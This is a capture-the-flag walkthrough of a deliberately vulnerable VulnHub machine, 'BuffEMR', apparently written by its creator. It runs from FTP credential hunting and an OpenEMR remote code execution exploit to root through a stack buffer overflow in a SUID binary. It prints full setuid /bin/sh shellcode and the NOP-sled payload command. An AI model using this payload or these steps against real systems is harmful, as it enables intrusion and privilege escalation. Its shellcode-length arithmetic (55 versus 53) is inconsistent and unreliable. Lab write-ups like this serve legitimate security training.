![](/images/2021-12-01-BuffEmr/0.png)


This is a walk through of "BuffEMR" machine created by myself and is available here for hacking: [BuffEmr](https://www.vulnhub.com/entry/buffemr-101,717/). 

This machines have been purposefully created for practicing penetration testing skills. I have been getting a lot of twitter DMs for hint and helps to PAWN this machine, so I decided to release the walkthrough !


Firstly, we will start with Nmap:

```

As we can see, there are three ports open (http, ftp, ssh).

We will check the webapp first:
#![](/images/2021-12-01-BuffEmr/1.png)

It is running openEMR, If you try try some default credentials, it won’t work!

For now, we will login into FTP as we can use anonymous login:

#![](/images/2021-12-01-BuffEmr/2.png)

The FTP share contains source code for openemr, let’s try and find out any interesting information’s here by searching for sensitive information (eg: grep -ri password .
  or grep -ri key .)


The first thing I found was a pdfkey for something :

#![](/images/2021-12-01-BuffEmr/3.png)

The second interesting thing I found was a file under /tests that contains admin creds : 

#![](/images/2021-12-01-BuffEmr/4.png)

Now let’s try and use this on openemr:

#![](/images/2021-12-01-BuffEmr/5.png)

Now we have access and we know the version.

After looking for exploits, I found multiple vulnerabilities for this version of OpenEMR including remote code execution.

Reference: [Exploit](https://www.exploit-db.com/exploits/45161)


Run the python file with a netcat listening on port 1337:

#![](/images/2021-12-01-BuffEmr/7.png)

#![](/images/2021-12-01-BuffEmr/8.png)

Now we have access to the box:

#![](/images/2021-12-01-BuffEmr/9.png)

We don’t have access to user folder, but we do have access to /var where I found a password protected zip file:

#![](/images/2021-12-01-BuffEmr/10.png)

Now I am going to transfer the file to my local machine and use the pdfkey found earlier to see what is in it:

#![](/images/2021-12-01-BuffEmr/11.png)


#![](/images/2021-12-01-BuffEmr/12.png)

The zip file contains the password which can be used to ssh as buffemr:

#![](/images/2021-12-01-BuffEmr/13.png)

#![](/images/2021-12-01-BuffEmr/14.png)

The first thing I do to escalate privilege is to see the current user AKA.BuffEMR have the rights to run anything as sudo, which in this case we does not have:

#![](/images/2021-12-01-BuffEmr/15.png)

Now after some enumeration, I found an executable owned by root (suid bit set) in the /opt directory :

#![](/images/2021-12-01-BuffEmr/16.png)

I ran strings command on the binary and found out that there is a function the binary use called “strcpy”.  The strcpy() function does not specify the size of the destination array, so buffer overrun is often a risk.

#![](/images/2021-12-01-BuffEmr/17.png)

Maybe, we will try to over flow the buffer to run a shell code to get root !

We will use gdb for this:

#![](/images/2021-12-01-BuffEmr/18.png)

The hex of A is \x41, at 520 it overrides EIP and at 510 it doesn’t override EIP, so we need to find the magic number that overrides EIP without going over, between 520 and 510:


After few tries, I found out that 516 is the magic number:

#![](/images/2021-12-01-BuffEmr/19.png)

Now, we need a shell code:

[shell-code-priv-esc]( https://github.com/san3ncrypt3d/shell-code-priv-esc)

This is the shell code I am going to use:
```
\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh

```

Let’s find out the length of the shell code:

#![](/images/2021-12-01-BuffEmr/20.png)

Our shell code is 55, we needed 516 A’s to override EIP, and 4 bytes is return address, so the buffer size will be 516-4 = 512

So, the plan is to use NOPs or no operations followed by shell code, to get a shell.

How many NOPs ?

512 – 53 = 459.

Note: NOP is \x90 in hex

So, we are going to run this:

```
python -c “print ‘\x90’ * 459 + ‘\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh’ + ‘\x41\x41\x41\x41’”
```



We don’t know the return address yet, so I am going to use 41 (A’s)

#![](/images/2021-12-01-BuffEmr/21.png)

Now use the command to examine the memory:
```
x/300wx $esp
```

#![](/images/2021-12-01-BuffEmr/22.png)

As we can see, the 0x90 is our NOP, so we can use any of the return address of the NOP to get our shell executed after:



Let’s run this:

```
run $(python -c "print '\x90'*459 + '\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh' + '\xc0\xd6\xff\xff'")
```

After execution, we get a shell but inside gdb it still says we don’t have the elevated privilege, so exit out of gdb and run the same command :


#![](/images/2021-12-01-BuffEmr/23.png)

Now we can access the root flag as we escalated our privilege :
